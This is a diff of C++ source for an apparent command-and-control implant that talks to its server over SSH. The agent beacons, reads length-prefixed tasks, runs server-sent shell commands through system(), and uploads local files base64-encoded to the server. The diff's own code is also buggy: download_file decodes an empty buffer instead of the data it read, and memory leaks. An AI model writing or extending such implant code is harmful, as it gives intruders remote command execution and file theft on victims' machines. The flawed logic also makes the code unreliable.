@@ -160,18 +160,45 @@ int Agent::write(char *buffer, int len) {
 }
 
 // PRIVATE: checked read from channel
-int Agent::read(char **buffer, int len) {
-	if(*buffer == nullptr) {
-		printf("Bruh wtf...\n");
+char *Agent::read(int len) {
+	char *buffer = (char*)malloc(len); 
+	// sanity check buffer
+	if(buffer == nullptr) {
+		printf("Malloc failed...\n");
 		exit(1);
 	}
-	int nbytes = ssh_channel_read(this->chan, *buffer, len, 0);
+	// read data
+	int nbytes = ssh_channel_read(this->chan, buffer, len, 0);
 	printf("read %d bytes from channel\n", nbytes);
 	if (nbytes < 0){
 		printf("Caught read error from server: %s\n", ssh_get_error(ssh_channel_get_session(chan)));
-    	return SSH_ERROR;
+    	return nullptr;
 	}
-	return SSH_OK;
+	
+	// all good
+	return buffer;
+}
+
+// PRIVATE: receives a tasking operation from the server
+AgentJob *Agent::read_tasking(){
+	// read and convert the header to usable thing
+	char *header = this->read(8); 
+	if(header == nullptr) return nullptr;
+	unsigned long h_val = AgentJob::bytes_to_long(header);
+	free(header);
+	AgentJob *job = new AgentJob(h_val, nullptr);
+
+	// now that we know the length, fetch the payload
+	char *data = this->read(job->get_len()); 
+	if(data == nullptr) {
+		// free stuff if the read fails
+		delete job;
+		return nullptr;
+	}
+
+	// set payload and return
+	job->set_data(data);
+	return job;
 }
 
 
@@ -222,20 +249,28 @@ int Agent::direct_forwarding(){
 
 // uploads file to the server
 int Agent::upload_file(void *path) {
+	/*
+	
+	Notes for later: 
+	State: server transport blocked read, burden of unblocking here.
+	
+	*/
+
+
+
+
 	// initialize variables
-	char buff[BUFSIZ];
-    char directory[BUFSIZ];
-    char tmpbuffer[8];
+	char directory[BUFSIZ];
+	char tmpbuffer[8];
     char *file_data;
     char *enc_data;
     int size = 0;
     size_t size_e = 0;
     int rc = 0;
 	int offset = Common::index_of((char*)path, '/', 1);
-	memset(buff, 0, sizeof(buff));
-    memset(directory, 0, sizeof(directory));
+	memset(directory, 0, sizeof(directory));
 	memset(tmpbuffer, 0, sizeof(tmpbuffer));
-	
+    
 
 	// get info aboutthe file
 	//printf("Sending file -> %s\n", path);
@@ -243,15 +278,13 @@ int Agent::upload_file(void *path) {
 
 	path = path + offset +1;
 	// TODO: Update to next-gen tasking structure
-	sprintf(buff, "11|%s", path);
-	if(write(buff,strlen(buff)) == SSH_ERROR) return 1;
-	if(read((char**)&tmpbuffer, 8) == SSH_ERROR) return 1;
-    
-    // sanity check to make sure the file exists    
+	//sprintf(buff, "11|%s", path);
+	//if(this->write(buff,strlen(buff)) == SSH_ERROR) return 1;
+	
+	// sanity check to make sure the file exists    
     if(size < 0){
         printf("Filename '%s' does not exist\n", path); 
-        rc = write("er", 3);
-        if(rc == SSH_ERROR){
+        if(this->write("er", 3) == SSH_ERROR){
             printf("Failed to write data to channel: %s\n",  ssh_get_error(ssh_channel_get_session(chan)));
         }
         return 2;
@@ -262,26 +295,31 @@ int Agent::upload_file(void *path) {
     sprintf(tmpbuffer, "%ld", size_e);
         
     // writes file size
-    if(write(tmpbuffer, sizeof(tmpbuffer)) == SSH_ERROR) return 1;
-    if(read((char**)&buff, sizeof(buff)) == SSH_ERROR) return 1;
+    if(this->write(tmpbuffer, sizeof(tmpbuffer)) == SSH_ERROR) return 1;
+	char *buffer = this->read(size); 
+    if(buffer == nullptr) return 1;
 
 	// encode the data
     B64::encode((unsigned char *)file_data, size, &enc_data);
         
-    // writes file 
-	if(write(enc_data, size_e) == SSH_ERROR) return 1;
-    memset(tmpbuffer, 0, 8);
-	if(read((char**)&tmpbuffer, 8) == SSH_ERROR) return 1;
+    // writes file
+	if(this->write(enc_data, size_e) == SSH_ERROR) return 1;
     
+	// free stuff
 	free(file_data);
     free(enc_data);
+	free(buffer);
 
+	char *t = this->read(8); 
+	if(t == nullptr) return 1;
+    
+	free(t);
     return 0;
 }
 
 // downloads a file from the server
 int Agent::download_file(void *filename){
-	int size = 0;
+	unsigned long size = 0;
     int size_e = 0;
     char *data_ptr;
     char *enc_ptr;
@@ -289,22 +327,23 @@ int Agent::download_file(void *filename){
     char tmpbuffer[256];
     FILE *file;
 	memset(buff, 0, sizeof(buff));
-	// TODO: update to next-gen tasking design
-	sprintf(buff, "10|%s", filename);
-	printf("Sending message...\n");
-
-	if(write(buff, strlen(buff)) == SSH_ERROR) return 1;
-    memset(tmpbuffer, 0, sizeof(tmpbuffer));
+	
 	// TODO: Add check OK function here too to make sure no errors actually show up on the server's end
-	if(read((char**)&tmpbuffer, sizeof(tmpbuffer)) == SSH_ERROR) return 1;
+	char *size_dat = this->read(8); 
+	if(size_dat == nullptr) return 1;
     
-    size = atoi(tmpbuffer);
+    size = AgentJob::bytes_to_long(size_dat);
     data_ptr = (char*)malloc(size+1);
     memset(data_ptr, 0, size+1);
             
     // writes file size
-	if(write("ok", 3) == SSH_ERROR) return 1;
-    if(read((char**)&data_ptr, size) == SSH_ERROR) return 1;
+	if(this->write("ok", 3) == SSH_ERROR) return 1;
+    char *data = this->read(size); 
+	if(data == nullptr) {
+		free(data_ptr);
+		return 1;
+	}
+
     size_e = B64::dec_size(data_ptr);
 
 	enc_ptr = (char*)malloc(size_e);
@@ -317,7 +356,7 @@ int Agent::download_file(void *filename){
     free(data_ptr);
             
     // writes file 
-    if(write("ok", 3) == SSH_ERROR) return 1;
+    if(this->write("ok", 3) == SSH_ERROR) return 1;
     memset(buff, 0, sizeof(buff));
     memset(tmpbuffer, 0, sizeof(tmpbuffer));
     sprintf(buff, "%s/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), filename);
@@ -337,8 +376,11 @@ int Agent::download_file(void *filename){
 // parses a particular task for the agent to handle
 AgentJob *Agent::parse_tasking(unsigned long tasking){
 	AgentJob *job = new AgentJob(tasking, nullptr);
-	void *data = malloc(job->get_len());
-	if(this->read((char**)&data, job->get_len()) == SSH_ERROR) return nullptr;
+	void *data = this->read(job->get_len());
+	if(data == nullptr) {
+		delete job;
+		return nullptr;
+	}
 	job->set_data(data);
 	return job;
 }
@@ -348,20 +390,18 @@ AgentJob *Agent::parse_tasking(unsigned long tasking){
 int Agent::run()
 {
 	printf("Identified as an agent\n");
-	unsigned long tmp = 0;
 	// say we are sending our beacon
 	// TODO: update this to new tasking design
-	if(write("1", 2) == SSH_ERROR) return SSH_ERROR;
-	if(read((char**)&tmp, 8) == SSH_ERROR) return SSH_ERROR;
-    
+	if(this->write("1", 2) == SSH_ERROR) return SSH_ERROR;
+	
 	//char *beacon = get_beacon();
 	AgentJob *nulltask = new AgentJob(AGENT_RESPONSE_OK, nullptr);
 				
 	//if(write(beacon, strlen(beacon)) == SSH_ERROR) return SSH_ERROR;
 	// block until we have a new task to do
-	while(read((char**)&tmp, sizeof(unsigned long)) != SSH_ERROR){
+	AgentJob *job = this->read_tasking();
+	while(job != nullptr){
 		printf("Reading..\n");
-		AgentJob *job = parse_tasking(tmp);
 		switch(job->get_type()) {
 			case AGENT_DIE:
 				printf("Got agent exit request\n");
@@ -383,7 +423,7 @@ int Agent::run()
 			case AGENT_EXECUTE_SHELLSCRIPT:
 				printf("Got tasking to execute command %s\n", (char*)(job->get_data()));
 				system((char*)(job->get_data()));
-				if(write((char*)nulltask->encode_header(), 0) == SSH_ERROR) return SSH_ERROR;
+				if(this->write((char*)nulltask->encode_header(), 0) == SSH_ERROR) return SSH_ERROR;
 				break;
 			case AGENT_EXECUTE_BINARY:
 				printf("Got tasking to execute module\n");
@@ -393,17 +433,20 @@ int Agent::run()
 				{
 					printf("Got send beacon request\n");
 					char *beacon = get_beacon();
-					if(write(beacon, strlen(beacon)) == SSH_ERROR) return SSH_ERROR;
+					if(this->write(beacon, strlen(beacon)) == SSH_ERROR) return SSH_ERROR;
 					break;
 				}
 			default:
 				printf("Caught unknown tasking value: %d\n", job->get_type());
 				break;
 		}
+
+		// get the next job
+		job = this->read_tasking();
 	}
 		
 	// close connections
 	// TODO: Update this to new structure
-	if(write("00|", 4) == SSH_ERROR) return SSH_ERROR;
+	if(this->write("00|", 4) == SSH_ERROR) return SSH_ERROR;
 	return SSH_OK;
 }
